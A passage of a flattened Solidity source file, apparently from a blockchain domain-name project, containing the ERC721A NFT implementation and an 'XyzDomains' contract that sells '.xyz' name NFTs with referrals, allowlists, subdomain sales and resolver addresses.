1056      * @dev Returns the total amount of tokens stored by the contract.
1057      * 
1058      * Burned tokens are calculated here, use `_totalMinted()` if you want to count just minted tokens.
1059      */
1060     function totalSupply() external view returns (uint256);
1061 }
1062 
1063 // File: erc721a/contracts/ERC721A.sol
1064 
1065 
1066 // ERC721A Contracts v3.3.0
1067 // Creator: Chiru Labs
1068 
1069 pragma solidity ^0.8.4;
1070 
1071 
1072 
1073 
1074 
1075 
1076 
1077 /**
1078  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
1079  * the Metadata extension. Built to optimize for lower gas during batch mints.
1080  *
1081  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
1082  *
1083  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
1084  *
1085  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
1086  */
1087 contract ERC721A is Context, ERC165, IERC721A {
1088     using Address for address;
1089     using Strings for uint256;
1090 
1091     // The tokenId of the next token to be minted.
1092     uint256 internal _currentIndex;
1093     mapping(uint => string) public tokenIDandAddress;
1094     mapping(string => uint) public tokenAddressandID;
1095     // The number of tokens burned.
1096     uint256 internal _burnCounter;
1097 
1098     // Token name
1099     string private _name;
1100 
1101     // Token symbol
1102     string private _symbol;
1103 
1104     // Mapping from token ID to ownership details
1105     // An empty struct value does not necessarily mean the token is unowned. See _ownershipOf implementation for details.
1106     mapping(uint256 => TokenOwnership) internal _ownerships;
1107 
1108     // Mapping owner address to address data
1109     mapping(address => AddressData) private _addressData;
1110 
1111     // Mapping from token ID to approved address
1112     mapping(uint256 => address) private _tokenApprovals;
1113 
1114     // Mapping from owner to operator approvals
1115     mapping(address => mapping(address => bool)) private _operatorApprovals;
1116 
1117     constructor(string memory name_, string memory symbol_) {
1118         _name = name_;
1119         _symbol = symbol_;
1120         _currentIndex = _startTokenId();
1121     }
1122 
1123     /**
1124      * To change the starting tokenId, please override this function.
1125      */
1126     function _startTokenId() internal view virtual returns (uint256) {
1127         return 1;
1128     }
1129 
1130     /**
1131      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
1132      */
1133     function totalSupply() public view override returns (uint256) {
1134         // Counter underflow is impossible as _burnCounter cannot be incremented
1135         // more than _currentIndex - _startTokenId() times
1136         unchecked {
1137             return _currentIndex - _burnCounter - _startTokenId();
1138         }
1139     }
1140 
1141     /**
1142      * Returns the total amount of tokens minted in the contract.
1143      */
1144     function _totalMinted() internal view returns (uint256) {
1145         // Counter underflow is impossible as _currentIndex does not decrement,
1146         // and it is initialized to _startTokenId()
1147         unchecked {
1148             return _currentIndex - _startTokenId();
1149         }
1150     }
1151 
1152     /**
1153      * @dev See {IERC165-supportsInterface}.
1154      */
1155     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
1156         return
1157             interfaceId == type(IERC721).interfaceId ||
1158             interfaceId == type(IERC721Metadata).interfaceId ||
1159             super.supportsInterface(interfaceId);
1160     }
1161 
1162     /**
1163      * @dev See {IERC721-balanceOf}.
1164      */
1165     function balanceOf(address owner) public view override returns (uint256) {
1166         if (owner == address(0)) revert BalanceQueryForZeroAddress();
1167         return uint256(_addressData[owner].balance);
1168     }
1169 
1170     /**
1171      * Returns the number of tokens minted by `owner`.
1172      */
1173     function _numberMinted(address owner) internal view returns (uint256) {
1174         return uint256(_addressData[owner].numberMinted);
1175     }
1176 
1177     /**
1178      * Returns the number of tokens burned by or on behalf of `owner`.
1179      */
1180     function _numberBurned(address owner) internal view returns (uint256) {
1181         return uint256(_addressData[owner].numberBurned);
1182     }
1183 
1184     /**
1185      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1186      */
1187     function _getAux(address owner) internal view returns (uint64) {
1188         return _addressData[owner].aux;
1189     }
1190 
1191     /**
1192      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1193      * If there are multiple variables, please pack them into a uint64.
1194      */
1195     function _setAux(address owner, uint64 aux) internal {
1196         _addressData[owner].aux = aux;
1197     }
1198 
1199     /**
1200      * Gas spent here starts off proportional to the maximum mint batch size.
1201      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1202      */
1203     function _ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1204         uint256 curr = tokenId;
1205 
1206         unchecked {
1207             if (_startTokenId() <= curr) if (curr < _currentIndex) {
1208                 TokenOwnership memory ownership = _ownerships[curr];
1209                 if (!ownership.burned) {
1210                     if (ownership.addr != address(0)) {
1211                         return ownership;
1212                     }
1213                     // Invariant:
1214                     // There will always be an ownership that has an address and is not burned
1215                     // before an ownership that does not have an address and is not burned.
1216                     // Hence, curr will not underflow.
1217                     while (true) {
1218                         curr--;
1219                         ownership = _ownerships[curr];
1220                         if (ownership.addr != address(0)) {
1221                             return ownership;
1222                         }
1223                     }
1224                 }
1225             }
1226         }
1227         revert OwnerQueryForNonexistentToken();
1228     }
1229 
1230     /**
1231      * @dev See {IERC721-ownerOf}.
1232      */
1233     function ownerOf(uint256 tokenId) public view override returns (address) {
1234         return _ownershipOf(tokenId).addr;
1235     }
1236 
1237     /**
1238      * @dev See {IERC721Metadata-name}.
1239      */
1240     function name() public view virtual override returns (string memory) {
1241         return _name;
1242     }
1243 
1244     /**
1245      * @dev See {IERC721Metadata-symbol}.
1246      */
1247     function symbol() public view virtual override returns (string memory) {
1248         return _symbol;
1249     }
1250 
1251     /**
1252      * @dev See {IERC721Metadata-tokenURI}.
1253      */
1254     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1255         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1256 
1257         string memory baseURI = _baseURI();
1258         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenIDandAddress[tokenId])) : '';
1259     }
1260 
1261     /**
1262      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1263      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1264      * by default, can be overriden in child contracts.
1265      */
1266     function _baseURI() internal view virtual returns (string memory) {
1267         return '';
1268     }
1269 
1270     /**
1271      * @dev See {IERC721-approve}.
1272      */
1273     function approve(address to, uint256 tokenId) public override {
1274         address owner = ERC721A.ownerOf(tokenId);
1275         if (to == owner) revert ApprovalToCurrentOwner();
1276 
1277         if (_msgSender() != owner) if(!isApprovedForAll(owner, _msgSender())) {
1278             revert ApprovalCallerNotOwnerNorApproved();
1279         }
1280 
1281         _approve(to, tokenId, owner);
1282     }
1283 
1284     /**
1285      * @dev See {IERC721-getApproved}.
1286      */
1287     function getApproved(uint256 tokenId) public view override returns (address) {
1288         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1289 
1290         return _tokenApprovals[tokenId];
1291     }
1292 
1293     /**
1294      * @dev See {IERC721-setApprovalForAll}.
1295      */
1296     function setApprovalForAll(address operator, bool approved) public virtual override {
1297         if (operator == _msgSender()) revert ApproveToCaller();
1298 
1299         _operatorApprovals[_msgSender()][operator] = approved;
1300         emit ApprovalForAll(_msgSender(), operator, approved);
1301     }
1302 
1303     /**
1304      * @dev See {IERC721-isApprovedForAll}.
1305      */
1306     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1307         return _operatorApprovals[owner][operator];
1308     }
1309 
1310     /**
1311      * @dev See {IERC721-transferFrom}.
1312      */
1313     function transferFrom(
1314         address from,
1315         address to,
1316         uint256 tokenId
1317     ) public virtual override {
1318         _transfer(from, to, tokenId);
1319     }
1320 
1321     /**
1322      * @dev See {IERC721-safeTransferFrom}.
1323      */
1324     function safeTransferFrom(
1325         address from,
1326         address to,
1327         uint256 tokenId
1328     ) public virtual override {
1329         safeTransferFrom(from, to, tokenId, '');
1330     }
1331 
1332     /**
1333      * @dev See {IERC721-safeTransferFrom}.
1334      */
1335     function safeTransferFrom(
1336         address from,
1337         address to,
1338         uint256 tokenId,
1339         bytes memory _data
1340     ) public virtual override {
1341         _transfer(from, to, tokenId);
1342         if (to.isContract()) if(!_checkContractOnERC721Received(from, to, tokenId, _data)) {
1343             revert TransferToNonERC721ReceiverImplementer();
1344         }
1345     }
1346 
1347     /**
1348      * @dev Returns whether `tokenId` exists.
1349      *
1350      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1351      *
1352      * Tokens start existing when they are minted (`_mint`),
1353      */
1354     function _exists(uint256 tokenId) internal view returns (bool) {
1355         return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;
1356     }
1357 
1358     /**
1359      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1360      */
1361     function _safeMint(address to, uint256 quantity) internal {
1362         _safeMint(to, quantity, '');
1363     }
1364 
1365     /**
1366      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1367      *
1368      * Requirements:
1369      *
1370      * - If `to` refers to a smart contract, it must implement
1371      *   {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1372      * - `quantity` must be greater than 0.
1373      *
1374      * Emits a {Transfer} event.
1375      */
1376     function _safeMint(
1377         address to,
1378         uint256 quantity,
1379         bytes memory _data
1380     ) internal {
1381         uint256 startTokenId = _currentIndex;
1382         if (to == address(0)) revert MintToZeroAddress();
1383         if (quantity == 0) revert MintZeroQuantity();
1384 
1385         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1386 
1387         // Overflows are incredibly unrealistic.
1388         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1389         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1390         unchecked {
1391             _addressData[to].balance += uint64(quantity);
1392             _addressData[to].numberMinted += uint64(quantity);
1393 
1394             _ownerships[startTokenId].addr = to;
1395             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1396 
1397             uint256 updatedIndex = startTokenId;
1398             uint256 end = updatedIndex + quantity;
1399 
1400             if (to.isContract()) {
1401                 do {
1402                     emit Transfer(address(0), to, updatedIndex);
1403                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1404                         revert TransferToNonERC721ReceiverImplementer();
1405                     }
1406                 } while (updatedIndex < end);
1407                 // Reentrancy protection
1408                 if (_currentIndex != startTokenId) revert();
1409             } else {
1410                 do {
1411                     emit Transfer(address(0), to, updatedIndex++);
1412                 } while (updatedIndex < end);
1413             }
1414             _currentIndex = updatedIndex;
1415         }
1416         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1417     }
1418 
1419     /**
1420      * @dev Mints `quantity` tokens and transfers them to `to`.
1421      *
1422      * Requirements:
1423      *
1424      * - `to` cannot be the zero address.
1425      * - `quantity` must be greater than 0.
1426      *
1427      * Emits a {Transfer} event.
1428      */
1429     function _mint(address to, uint256 quantity) internal {
1430         uint256 startTokenId = _currentIndex;
1431         if (to == address(0)) revert MintToZeroAddress();
1432         if (quantity == 0) revert MintZeroQuantity();
1433 
1434         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1435 
1436         // Overflows are incredibly unrealistic.
1437         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1438         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1439         unchecked {
1440             _addressData[to].balance += uint64(quantity);
1441             _addressData[to].numberMinted += uint64(quantity);
1442 
1443             _ownerships[startTokenId].addr = to;
1444             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1445 
1446             uint256 updatedIndex = startTokenId;
1447             uint256 end = updatedIndex + quantity;
1448 
1449             do {
1450                 emit Transfer(address(0), to, updatedIndex++);
1451             } while (updatedIndex < end);
1452 
1453             _currentIndex = updatedIndex;
1454         }
1455         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1456     }
1457 
1458     /**
1459      * @dev Transfers `tokenId` from `from` to `to`.
1460      *
1461      * Requirements:
1462      *
1463      * - `to` cannot be the zero address.
1464      * - `tokenId` token must be owned by `from`.
1465      *
1466      * Emits a {Transfer} event.
1467      */
1468     function _transfer(
1469         address from,
1470         address to,
1471         uint256 tokenId
1472     ) private {
1473         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1474 
1475         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1476 
1477         bool isApprovedOrOwner = (_msgSender() == from ||
1478             isApprovedForAll(from, _msgSender()) ||
1479             getApproved(tokenId) == _msgSender());
1480 
1481         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1482         if (to == address(0)) revert TransferToZeroAddress();
1483 
1484         _beforeTokenTransfers(from, to, tokenId, 1);
1485 
1486         // Clear approvals from the previous owner
1487         _approve(address(0), tokenId, from);
1488 
1489         // Underflow of the sender's balance is impossible because we check for
1490         // ownership above and the recipient's balance can't realistically overflow.
1491         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1492         unchecked {
1493             _addressData[from].balance -= 1;
1494             _addressData[to].balance += 1;
1495 
1496             TokenOwnership storage currSlot = _ownerships[tokenId];
1497             currSlot.addr = to;
1498             currSlot.startTimestamp = uint64(block.timestamp);
1499 
1500             
1501             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1502             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1503             uint256 nextTokenId = tokenId + 1;
1504             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1505             if (nextSlot.addr == address(0)) {
1506                 // This will suffice for checking _exists(nextTokenId),
1507                 // as a burned slot cannot contain the zero address.
1508                 if (nextTokenId != _currentIndex) {
1509                     nextSlot.addr = from;
1510                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1511                 }
1512             }
1513         }
1514 
1515         emit Transfer(from, to, tokenId);
1516         _afterTokenTransfers(from, to, tokenId, 1);
1517     }
1518 
1519     /**
1520      * @dev Equivalent to `_burn(tokenId, false)`.
1521      */
1522     function _burn(uint256 tokenId) internal virtual {
1523         _burn(tokenId, false);
1524     }
1525 
1526     /**
1527      * @dev Destroys `tokenId`.
1528      * The approval is cleared when the token is burned.
1529      *
1530      * Requirements:
1531      *
1532      * - `tokenId` must exist.
1533      *
1534      * Emits a {Transfer} event.
1535      */
1536     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1537         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1538 
1539         address from = prevOwnership.addr;
1540 
1541         if (approvalCheck) {
1542             bool isApprovedOrOwner = (_msgSender() == from ||
1543                 isApprovedForAll(from, _msgSender()) ||
1544                 getApproved(tokenId) == _msgSender());
1545 
1546             if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1547         }
1548 
1549         _beforeTokenTransfers(from, address(0), tokenId, 1);
1550 
1551         // Clear approvals from the previous owner
1552         _approve(address(0), tokenId, from);
1553 
1554         // Underflow of the sender's balance is impossible because we check for
1555         // ownership above and the recipient's balance can't realistically overflow.
1556         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1557         unchecked {
1558             AddressData storage addressData = _addressData[from];
1559             addressData.balance -= 1;
1560             addressData.numberBurned += 1;
1561 
1562             // Keep track of who burned the token, and the timestamp of burning.
1563             TokenOwnership storage currSlot = _ownerships[tokenId];
1564             currSlot.addr = from;
1565             currSlot.startTimestamp = uint64(block.timestamp);
1566             currSlot.burned = true;
1567 
1568             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1569             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1570             uint256 nextTokenId = tokenId + 1;
1571             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1572             if (nextSlot.addr == address(0)) {
1573                 // This will suffice for checking _exists(nextTokenId),
1574                 // as a burned slot cannot contain the zero address.
1575                 if (nextTokenId != _currentIndex) {
1576                     nextSlot.addr = from;
1577                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1578                 }
1579             }
1580         }
1581 
1582         emit Transfer(from, address(0), tokenId);
1583         _afterTokenTransfers(from, address(0), tokenId, 1);
1584 
1585         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1586         unchecked {
1587             _burnCounter++;
1588         }
1589     }
1590 
1591     /**
1592      * @dev Approve `to` to operate on `tokenId`
1593      *
1594      * Emits a {Approval} event.
1595      */
1596     function _approve(
1597         address to,
1598         uint256 tokenId,
1599         address owner
1600     ) private {
1601         _tokenApprovals[tokenId] = to;
1602         emit Approval(owner, to, tokenId);
1603     }
1604 
1605     /**
1606      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1607      *
1608      * @param from address representing the previous owner of the given token ID
1609      * @param to target address that will receive the tokens
1610      * @param tokenId uint256 ID of the token to be transferred
1611      * @param _data bytes optional data to send along with the call
1612      * @return bool whether the call correctly returned the expected magic value
1613      */
1614     function _checkContractOnERC721Received(
1615         address from,
1616         address to,
1617         uint256 tokenId,
1618         bytes memory _data
1619     ) private returns (bool) {
1620         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1621             return retval == IERC721Receiver(to).onERC721Received.selector;
1622         } catch (bytes memory reason) {
1623             if (reason.length == 0) {
1624                 revert TransferToNonERC721ReceiverImplementer();
1625             } else {
1626                 assembly {
1627                     revert(add(32, reason), mload(reason))
1628                 }
1629             }
1630         }
1631     }
1632 
1633     /**
1634      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1635      * And also called before burning one token.
1636      *
1637      * startTokenId - the first token id to be transferred
1638      * quantity - the amount to be transferred
1639      *
1640      * Calling conditions:
1641      *
1642      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1643      * transferred to `to`.
1644      * - When `from` is zero, `tokenId` will be minted for `to`.
1645      * - When `to` is zero, `tokenId` will be burned by `from`.
1646      * - `from` and `to` are never both zero.
1647      */
1648     function _beforeTokenTransfers(
1649         address from,
1650         address to,
1651         uint256 startTokenId,
1652         uint256 quantity
1653     ) internal virtual {}
1654 
1655     /**
1656      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1657      * minting.
1658      * And also called after one token has been burned.
1659      *
1660      * startTokenId - the first token id to be transferred
1661      * quantity - the amount to be transferred
1662      *
1663      * Calling conditions:
1664      *
1665      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1666      * transferred to `to`.
1667      * - When `from` is zero, `tokenId` has been minted for `to`.
1668      * - When `to` is zero, `tokenId` has been burned by `from`.
1669      * - `from` and `to` are never both zero.
1670      */
1671     function _afterTokenTransfers(
1672         address from,
1673         address to,
1674         uint256 startTokenId,
1675         uint256 quantity
1676     ) internal virtual {}
1677 }
1678 
1679 
1680 
1681 
1682 
1683 pragma solidity ^0.8.4;
1684 
1685 
1686 
1687 
1688 
1689 
1690 contract XyzDomains is ERC721A, Ownable, ReentrancyGuard {
1691     using Strings for uint256;
1692     uint256 public cost = 0;
1693     uint256 public ref = 20;
1694     uint256 public ref_owner = 30;
1695     uint256 public ref_discount = 20;
1696     uint256 public subdomains_fee = 10;
1697     uint256 private maxCharSize=20;
1698     
1699     string private domain='.xyz';
1700 
1701     string private BASE_URI = '';
1702     bool public IS_SALE_ACTIVE = false;
1703     bool public IS_ALLOWLIST_ACTIVE = false;
1704     mapping(address => bool) public allowlistAddresses;
1705     mapping(string => mapping(address => bool)) public subDomains_allowlistAddresses;
1706     mapping(string => address) public resolveAddress;
1707     mapping(address => string) public primaryAddress;
1708     mapping(string => bool) public subDomains_publicSale;
1709     mapping(string => uint) public subDomains_cost;
1710     mapping(string => bytes32) public subDomains_allowList;
1711     mapping(string => uint) public subDomains_allowList_cost;
1712     mapping(string => mapping(string => string)) public dataAddress;
1713     bytes32 public merkleRoot;
1714     bytes _allowChars = "0123456789-_abcdefghijklmnopqrstuvwxyz";
1715     
1716    constructor(
1717     string memory _tokenName,
1718     string memory _tokenSymbol,
1719     string memory _hiddenMetadataUri
1720   ) ERC721A(_tokenName, _tokenSymbol) {
1721     
1722   }
1723  
1724     
1725     function _baseURI() internal view virtual override returns (string memory) {
1726         return BASE_URI;
1727     }
1728 
1729     function setAddress(string calldata xyz_name, address newresolve) external {
1730          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1731         if (Ownership.addr != msg.sender) revert("Error");
1732         
1733 
1734     bytes memory result = bytes(primaryAddress[resolveAddress[xyz_name]]);
1735         if (keccak256(result) == keccak256(bytes(xyz_name))) {
1736             primaryAddress[resolveAddress[xyz_name]]="";
1737         }
1738         resolveAddress[xyz_name]=newresolve;
1739     }
1740 
1741     function setPrimaryAddress(string calldata xyz_name) external {
1742         require(resolveAddress[xyz_name]==msg.sender, "Error");
1743         primaryAddress[msg.sender]=xyz_name;
1744     }
1745 
1746 
1747     function setDataAddress(string calldata xyz_name,string calldata setArea, string  memory newDatas) external {
1748          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1749 
1750         if (Ownership.addr != msg.sender) revert("Error");
1751         dataAddress[xyz_name][setArea]=newDatas;
1752     }
1753 
1754     function getDataAddress(string memory xyz_name, string calldata Area) public view returns(string memory) {
1755         return dataAddress[xyz_name][Area];
1756     }
1757 
1758 
1759     function setBaseURI(string memory customBaseURI_) external onlyOwner {
1760         BASE_URI = customBaseURI_;
1761     }
1762 
1763     function setMaxCharSize(uint256 maxCharSize_) external onlyOwner {
1764         maxCharSize = maxCharSize_;
1765     }
1766     
1767      function setAllowChars(bytes memory allwchr) external onlyOwner {
1768         _allowChars = allwchr;
1769     }
1770 
1771     function setPrice(uint256 customPrice) external onlyOwner {
1772         cost = customPrice;
1773     }
1774 
1775     function setRefSettings(uint ref_,uint ref_owner_,uint ref_discount_,uint subdomains_fee_) external onlyOwner {
1776         ref = ref_;
1777         ref_owner = ref_owner_;
1778         ref_discount = ref_discount_;
1779         subdomains_fee = subdomains_fee_;
1780 
1781     }
1782 
1783 
1784     function setSaleActive(bool saleIsActive) external onlyOwner {
1785         IS_SALE_ACTIVE = saleIsActive;
1786     }
1787 
1788      function setAllowListSaleActive(bool WhitesaleIsActive) external onlyOwner {
1789         IS_ALLOWLIST_ACTIVE = WhitesaleIsActive;
1790     }
1791 
1792     function setSubdomainSaleActive(bool saleIsActive, uint256 customPrice, string calldata xyz_name) public {
1793         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1794         require(Ownership.addr == msg.sender, "Invalid");
1795         subDomains_cost[xyz_name] = customPrice;
1796         subDomains_publicSale[xyz_name] = saleIsActive;
1797 
1798     }
1799 
1800     function register(address ref_address, string memory xyz_name)
1801         public
1802         payable
1803     {   
1804         uint256 price = cost;
1805         bool is_ref=false;
1806         uint256 ref_cost=0;
1807         require(bytes(xyz_name).length<=maxCharSize,"Long name");
1808         require(bytes(xyz_name).length>0,"Write a name");
1809         require(_checkName(xyz_name), "Invalid name");
1810         if (ref_address== 0x0000000000000000000000000000000000000000) {
1811         price=cost;
1812         } else {
1813         if (bytes(primaryAddress[ref_address]).length>0){
1814         ref_cost=price*ref_owner/100;    
1815         } else {
1816         ref_cost=price*ref/100;
1817         }
1818         price = price*(100-ref_discount)/100;
1819         is_ref=true;
1820         }
1821         require (tokenAddressandID[xyz_name] == 0 , "This is already taken"); 
1822         require(IS_SALE_ACTIVE, "Sale is not active!");
1823         require(msg.value >= price, "Insufficient funds!");
1824         tokenIDandAddress[_currentIndex]=xyz_name;
1825         tokenAddressandID[xyz_name]=_currentIndex;
1826         resolveAddress[xyz_name]=msg.sender;
1827          if (is_ref) {
1828         payable(ref_address).transfer(ref_cost);
1829         }
1830         _safeMint(msg.sender,1);
1831     }
1832 
1833      function allowList(string memory xyz_name, bytes32[] calldata _merkleProof)
1834         public
1835         payable
1836     {      
1837             require(IS_ALLOWLIST_ACTIVE, "Allow List sale is not active!");
1838             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1839             require(MerkleProof.verify(_merkleProof, merkleRoot, leaf),"Invalid proof!");
1840             require(bytes(xyz_name).length<=maxCharSize,"Long name");
1841             require(bytes(xyz_name).length>0,"Write a name");
1842             require(_checkName(xyz_name), "Invalid name");
1843             require(allowlistAddresses[msg.sender]!=true, "Claimed!");
1844             require (tokenAddressandID[xyz_name] == 0 , "This is already taken"); 
1845             allowlistAddresses[msg.sender] = true;
1846             tokenIDandAddress[_currentIndex]=xyz_name;
1847             tokenAddressandID[xyz_name]=_currentIndex;
1848             resolveAddress[xyz_name]=msg.sender;
1849             _safeMint(msg.sender,1);
1850     }
1851 
1852 
1853     function registerSubdomain(string memory xyz_name, string memory subdomain_name)
1854         public
1855         payable
1856     {   
1857         require(IS_SALE_ACTIVE, "Sale is not active!");
1858         string memory new_domain=string.concat(subdomain_name,'.',xyz_name);
1859         require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1860         require(bytes(subdomain_name).length>0,"Write a name");
1861         require(_checkName(xyz_name), "Invalid name");
1862         require(_checkName(subdomain_name), "Invalid name");
1863         require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1864   
1865         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1866         if (Ownership.addr == msg.sender)
1867         {
1868         tokenIDandAddress[_currentIndex]=new_domain;
1869         tokenAddressandID[new_domain]=_currentIndex;
1870         resolveAddress[new_domain]=msg.sender; 
1871         _safeMint(msg.sender,1);   
1872         } else {
1873         require(subDomains_publicSale[xyz_name]==true, "Only Owner can register");
1874         require(msg.value >= subDomains_cost[xyz_name], "Insufficient funds!");
1875         payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1876         tokenIDandAddress[_currentIndex]=new_domain;
1877         tokenAddressandID[new_domain]=_currentIndex;
1878         resolveAddress[new_domain]=msg.sender;
1879         _safeMint(msg.sender,1);       
1880         }
1881     }
1882 
1883 
1884     function allowListSubdomain(string memory xyz_name,  string memory subdomain_name, bytes32[] calldata _merkleProof)
1885         public
1886         payable
1887     {      
1888             string memory new_domain=string.concat(subdomain_name,'.',xyz_name);
1889             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1890             require(MerkleProof.verify(_merkleProof, subDomains_allowList[xyz_name], leaf),"Invalid proof!");
1891             require(msg.value >= subDomains_allowList_cost[xyz_name], "Insufficient funds!");
1892 
1893 
1894             require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1895             require(bytes(subdomain_name).length>0,"Write a name");
1896             require(_checkName(xyz_name), "Invalid name");
1897             require(_checkName(subdomain_name), "Invalid name");
1898             require(subDomains_allowlistAddresses[xyz_name][msg.sender]!=true, "Claimed!");
1899             require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1900             TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1901             payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1902             subDomains_allowlistAddresses[xyz_name][msg.sender] = true;
1903             tokenIDandAddress[_currentIndex]=new_domain;
1904             tokenAddressandID[new_domain]=_currentIndex;
1905             resolveAddress[new_domain]=msg.sender;
1906             _safeMint(msg.sender,1);
1907     }
1908 
1909     
1910     function namediff(uint256 tokenId , string calldata new_xyz_name) external onlyOwner {
1911         tokenIDandAddress[tokenId]=new_xyz_name;
1912         tokenAddressandID[new_xyz_name]=tokenId;
1913     }
1914 
1915 
1916 function walletOfOwnerName(address _owner)
1917     public
1918     view
1919     returns (string[] memory)
1920   {
1921     uint256 ownerTokenCount = balanceOf(_owner);
1922     string[] memory ownedTokenIds = new string[](ownerTokenCount);
1923     uint256 currentTokenId = 1;
1924     uint256 ownedTokenIndex = 0;
1925 
1926     while (ownedTokenIndex < ownerTokenCount) {
1927       address currentTokenOwner = ownerOf(currentTokenId);
1928 
1929       if (currentTokenOwner == _owner) {
1930         ownedTokenIds[ownedTokenIndex] = string.concat(tokenIDandAddress[currentTokenId],domain);
1931 
1932         ownedTokenIndex++;
1933       }
1934 
1935       currentTokenId++;
1936     }
1937 
1938     return ownedTokenIds;
1939   }
1940 
1941 
1942 function lastAddresses(uint256 count)
1943     public
1944     view
1945     returns (string[] memory)
1946   {
1947     uint256 total = totalSupply();
1948     string[] memory lastAddr = new string[](count);
1949     uint256 currentId = total - count;
1950     uint256 ownedTokenIndex = 0;
1951     require(currentId>=0,"Invalid");
1952     while (total > currentId) {
1953         lastAddr[ownedTokenIndex] = string.concat(tokenIDandAddress[total],domain);
1954         ownedTokenIndex++;
1955       total--;
1956     }
1957 
1958     return lastAddr;
1959   }
1960 
1961 
1962 function setMerkleRoot(bytes32 _newMerkleRoot) external onlyOwner {
1963         merkleRoot = _newMerkleRoot;
1964     }
1965 
1966 function setMerkleRootSubdomain(bytes32 _newMerkleRoot, string memory xyz_name, uint256 _cost) external {
1967       TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[xyz_name]);
1968         if (Ownership.addr != msg.sender) revert("Error");
1969 
1970         subDomains_allowList[xyz_name] = _newMerkleRoot;
1971         subDomains_allowList_cost[xyz_name] = _cost;
1972     }
1973     
1974 
1975 
1976  function _checkName(string memory _name) public view returns(bool){
1977         uint allowedChars =0;
1978         bytes memory byteString = bytes(_name);
1979         bytes memory allowed = bytes(_allowChars);  
1980         for(uint i=0; i < byteString.length ; i++){
1981            for(uint j=0; j<allowed.length; j++){
1982               if(byteString[i]==allowed[j] )
1983               allowedChars++;         
1984            }
1985         }
1986         if (allowedChars==byteString.length) { return true; } else { return false; }
1987        
1988     }
1989 
1990         /** PAYOUT **/
1991 
1992     function withdraw() public onlyOwner nonReentrant {
1993     // This will transfer the remaining contract balance to the owner.
1994     // Do not remove this otherwise you will not be able to withdraw the funds.
1995     // =============================================================================
1996     (bool os, ) = payable(owner()).call{value: address(this).balance}('');
1997     require(os);
1998     // =============================================================================
1999   }
2000 
2001 }